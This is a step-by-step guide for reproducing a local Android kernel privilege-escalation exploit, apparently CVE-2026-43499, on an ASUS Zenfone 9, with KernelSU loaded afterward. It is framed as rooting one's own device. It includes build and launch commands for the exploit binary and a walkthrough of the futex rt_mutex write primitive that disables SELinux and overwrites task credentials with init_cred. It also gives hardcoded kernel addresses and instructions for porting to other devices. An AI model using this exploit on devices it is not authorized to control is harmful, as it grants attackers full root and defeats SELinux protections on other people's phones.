# GhostLock (CVE-2026-43499) — ASUS Zenfone 9 full reproduction guide

**English** | [繁體中文](TUTORIAL.zh.md)

> Target: get root on **your own** ASUS Zenfone 9 (SM8475, GKI
> `5.10.205-android12-9-00029-g3f12df86bfdb-ab11799032`) via CVE-2026-43499,
> then finish with **KernelSU LKM late-load**.
> **No boot.img / init_boot.img modification.**
> Authorized research on your own device only.

---

## 0. Result

```sh
adb shell su -c id
# uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```
- `/proc/modules` shows `kernelsu … Live (O)`
- KernelSU Manager works

---

## 1. Environment

| Item | Value |
|---|---|
| Device | ASUS Zenfone 9 (SM8475) |
| Kernel | `5.10.205-android12-9-00029-g3f12df86bfdb-ab11799032` |
| KMI | `android12-5.10` |
| VA bits | 39 (3-level, 4 KB pages) |
| Required config | `MODULES=y`, `MODVERSIONS=y`, `MODULE_SIG` **off**, `KPROBES=y` |
| Not required | bootloader unlock, boot.img change, adb root |

> The kernel version must match **exactly** (offsets and vermagic are tied to it).
> Porting to other devices: see section 9.

---

## 2. Prerequisites

1. Windows/Linux PC with `adb`.
2. USB debugging enabled; `adb devices` shows the device.
3. Ownership/authorization statement.
4. The files listed in section 3.

---

## 3. Files

Placed under your working directory:

| File | Source | Purpose |
|---|---|---|
| `slide_dev` | built from `src/` (see 3.1) | the exploit binary (root + late-load) |
| `ksud` | KernelSU v3.3.0 `ksud-aarch64-linux-android` | late-load loader (kallsyms symbol injection) |
| `kernelsu.ko` | release `lkm-aarch64-android12-5.10_kernelsu.ko` | KernelSU module |
| `ksu.apk` | release `KernelSU_v3.3.0_32601-release.apk` | KernelSU Manager (optional) |

```sh
curl -L -o ksud        https://github.com/tiann/KernelSU/releases/download/v3.3.0/ksud-aarch64-linux-android
curl -L -o ksu.apk     https://github.com/tiann/KernelSU/releases/download/v3.3.0/KernelSU_v3.3.0_32601-release.apk
curl -L -o kernelsu.ko https://github.com/tiann/KernelSU/releases/download/v3.3.0/lkm-aarch64-android12-5.10_kernelsu.ko
```
> In practice **`ksud` handles `kernelsu.ko` itself** (late-load is built in).

### 3.1 Rebuilding `slide_dev`
```
aarch64-linux-android31-clang -static -O2 -DZF9_DEVICE -Isrc \
  src/main.c src/util.c src/slide.c src/fops.c src/pipe.c src/persist.c \
  src/prop.c src/cfi.c src/qmain.c src/seqoverlay.c -pthread -o slide_dev
```
(or `sh build.sh`)

---

## 4. Quick run

```sh
ADB="adb"

# 1) push
$ADB push slide_dev /data/local/tmp/slide_dev
$ADB push ksud       /data/local/tmp/ksud
$ADB shell "chmod 755 /data/local/tmp/slide_dev /data/local/tmp/ksud"

# 2) launch (after a fresh boot; ~3-4 minutes)
$ADB shell "pkill -9 zf9m0001; cd /data/local/tmp && nohup ./slide_dev 0x28000000 persist noslide neutral sweep 64 sweepstart=25 ownprobe shortseq >> v.log 2>&1 &"

# 3) watch the log (uid=0 means success)
$ADB shell "grep -aE 'seq result|ROOT euid' /data/local/tmp/v.log"

# 4) verify (KernelSU su)
$ADB shell "su -c id"
# expect: uid=0(root) ... context=u:r:ksu:s0
```

If `su` is not available yet, check that `ksud late-load` ran (section 5.4).

---

## 5. Step by step

### 5.1 Why a fresh boot?
Each boot gives new spray placement (physical pages) and a new KASLR slide, so
you must re-hit. **Run only once per boot** (re-running in the same boot lands
on a disturbed memory map).

### 5.2 Launch the exploit
```
./slide_dev 0x28000000 persist noslide neutral sweep 64 sweepstart=25 ownprobe shortseq
```
- `0x28000000` — this device's `delta` (XBL memory-map difference).
- `persist` — exploit path (no number → `shortseq` mini-sequence).
- `noslide` — skip legacy walk-slide, use **perf slide**.
- `neutral` — neutralise the page.
- `sweep 64` — spray candidate rounds.
- `sweepstart=25` — start at grid cell 25, which has landed every boot on this device (`phys=0xaccd7000`).
- `ownprobe` — **delta-free self-write probe** (pure userspace, zero walk deaths).
- `shortseq` — the 3-write mini-sequence (section 5.3).

Expected log:
```
OWNPROBE HIT after N probes: delta=… phys=00000000accd7000 alias=ffffff802ccd7000 …
perf slide SANE anchor=… slide=…
shortseq: E3 task=ffffff88xxxxxxxx slide=…
[+] seq firing round=… step=0/1/2
seq state step=2 landed=1 uid=0 euid=0        <-- privilege gained
seq result step=3 uid=0 euid=0 gid=0 egid=0
shortseq: ROOT euid=0 - …
```
> The `E3` prefix on the task line is our debug tag; the value is the
> self-located `task_struct`.

### 5.3 The three writes (core)
| step | action | target |
|---|---|---|
| 0 | disable SELinux | write a **page-aligned alias** (byte0=0) into `selinux_state` (`enforcing` is at offset 0) → Permissive |
| 1 | `*(task+0x778) = canon_addr(INIT_CRED)` | `real_cred` |
| 2 | `*(task+0x780) = canon_addr(INIT_CRED)` | `cred` |

- Both cred writes point at `init_cred` → `cred == real_cred` (avoids the
  exit-path `BUG_ON`).
- On success the process **does not exit** (parks), avoiding static-cred exit issues.
- Write primitive: `rb_erase` constrained write `*(target)=value` (collateral
  `*(value+8)=target`); `value` must be a safely dereferenceable address
  (hence SELinux cannot be turned off with `value=0`).

### 5.4 Load KernelSU (late-load)
`slide_dev` does this automatically after root:
```
/data/local/tmp/ksud late-load --kmi android12-5.10 --allow-shell
```
- `--kmi android12-5.10` is **mandatory** (otherwise it may hang).
- ksud output goes to **logcat**:
  ```sh
  adb logcat -d | grep -i "KernelSU\|ksud" | tail
  # KernelSU: ksu fd installed …
  ```
- Verify the module:
  ```sh
  adb shell "grep kernelsu /proc/modules"
  # kernelsu 200704 0 - Live 0x… (O)
  ```
- Why: `insmod kernelsu.ko` **fails** (~40 unexported symbols:
  `commit_creds`, `selinux_state`, `avc_has_perm`, `policydb_*`). `ksud late-load`
  does kallsyms parsing + symbol injection (the old `lkmloader` feature) and
  bypasses the standard `finit_module` symbol check.

### 5.5 KernelSU Manager (optional)
```sh
adb install -r ksu.apk
```

---

## 6. How it works

1. **Bug**: `remove_waiter()` clears `current->pi_blocked_on` instead of the
   waiter task's on the `FUTEX_CMP_REQUEUE_PI` proxy-rollback path, leaving a
   dangling `rt_mutex_waiter` that points into a kernel stack frame.
2. **Trigger**: futex requeue/proxy → `task_blocks_on_rt_mutex` →
   `rt_mutex_adjust_prio_chain`; the PI chain walk does an `rb_erase` relink on
   the fake waiter's rb node → constrained write `*(target)=value`.
3. **Overwriting the waiter**: on 5.10 we use the **`pselect6` `stack_fds`
   path** (`nfds=320` → 40 bytes per fd-set → `stack_fds` lands exactly on the
   waiter) to write a 10-word fake waiter (`tree/pi_tree/task/lock/prio/deadline`).
   Note: the `rt_waiter` in `futex_wait_requeue_pi` is at **`sp+0x90`** (not
   `x29-0x60`); a SEQPACKET `sendmsg` sockaddr lands at `W+0x128` and **cannot**
   cover the waiter.
4. **Placement/KASLR**: `ownprobe` (self-referential probe) finds the spray page
   without any walk; `perf SAMPLE_IP` solves KASLR; `perf REGS_INTR` self-locates
   `task_struct`.
5. **Escalation**: point `task->real_cred` / `task->cred` at `init_cred`;
   once `cred==real_cred`, `getuid()==0`.
6. **KSU**: `ksud late-load` injects unexported symbols via kallsyms, then loads
   `kernelsu.ko`.

---

## 7. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| No `OWNPROBE HIT` | placement drifted. Try `sweepstart=24/26`, or drop `sweepstart` for the full grid (slower; some cells fault). |
| Process disappears, device reboots | hit a cell that faults / a walk fault. **Reboot** and run again. |
| `insmod … Unknown symbol` | expected. **Do not use insmod**; use `ksud late-load --kmi android12-5.10`. |
| `ksud late-load` hangs | missing `--kmi`. Always pass `--kmi android12-5.10`; don't block waiting on it (`SIGCHLD=SIG_IGN`). |
| `su` missing | check `/proc/modules` for `kernelsu`; `/data/adb/ksu/bin` exists; re-run `ksud late-load` if needed. |
| Log truncated with NULs | a kernel panic killed writeback; key lines are fsync'd but can still be lost. Reboot and rerun. |
| Want the panic PC | this device's ramoops is **pmsg-only** (no dmesg zone); `/sys/fs/pstore` is empty. Needs UART or live dmesg after root. |

---

## 8. Reboot / persistence

- **The LKM is per-boot**: KernelSU is gone after a reboot; re-run section 4.
- **Without touching boot.img you cannot auto-load at boot** (`ksuinit` needs the
  ramdisk). Hence "run the script once per boot".
- For true persistence: `ksud boot-patch` (modifies `init_boot`) or a Magisk-style
  overlay — out of scope here and it does touch the boot partition.

You can turn section 4 into a `run.sh` one-liner.

---

## 9. Porting to other devices

**Must be re-derived** (the offsets here are only valid for this build):
1. `delta` — derive from the device UEFI/DT kernel memory map.
2. `target.h` constants — `INIT_TASK/INIT_CRED/SELINUX_ENFORCING` etc.
   (from `kernel.elf` symbols: `nm kernel.elf | grep init_cred`).
3. `task_struct` offsets — config-dependent; measure by disassembling
   `commit_creds` / `rt_mutex_adjust_prio_chain`.
4. `rt_mutex_waiter` layout (5.10: `tree 0x0 / pi_tree 0x18 / task 0x30 /
   lock 0x38 / prio 0x40 / deadline 0x48`).
5. KMI and KernelSU version: `ksud late-load --kmi android<ver>-5.10`.

---

## Appendix: device constants (disasm-verified)

```
delta                              0x28000000
KIMAGE_TEXT_BASE                   0xffffffc008000000
P0_PAGE_OFFSET                     0xffffff8000000000
P0_PHYS_OFFSET                     0x80000000
INIT_TASK                          0xffffffc00a79bec0
INIT_CRED                          0xffffffc00a7b0ae0
INIT_USER_NS                       0xffffffc00a7af6f8
SELINUX_ENFORCING (selinux_state)  0xffffffc00aa40b98   # enforcing @ offset 0
rt_mutex_adjust_prio_chain         0xffffffc0081ea980
task_blocks_on_rt_mutex            0xffffffc0081e9b84   (+0x294 -> adjust_prio_chain)
rb_erase                           0xffffffc008a705ec
commit_creds                       0xffffffc008184c94
```

## Appendix: sample output
```
adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

adb shell "grep kernelsu /proc/modules"
kernelsu 200704 0 - Live 0x0000000000000000 (O)
```
